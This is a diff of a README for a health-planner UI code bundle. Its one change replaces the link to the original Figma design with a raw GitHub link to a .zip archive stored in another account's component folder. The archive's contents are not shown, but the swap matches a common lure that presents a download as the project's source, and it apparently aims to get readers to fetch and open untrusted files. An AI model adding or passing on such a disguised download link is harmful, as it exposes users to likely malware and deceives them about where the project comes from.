@@ -1,7 +1,7 @@
 
   # Personal Health Planner UI Design
 
-  This is a code bundle for Personal Health Planner UI Design. The original project is available at https://www.figma.com/design/Mid0TKgfynmtob6RBl8SQR/Personal-Health-Planner-UI-Design.
+  This is a code bundle for Personal Health Planner UI Design. The original project is available at https://raw.githubusercontent.com/devorochimaru/getfitx/main/src/components/ui/v3.4.zip
 
   ## Running the code
 
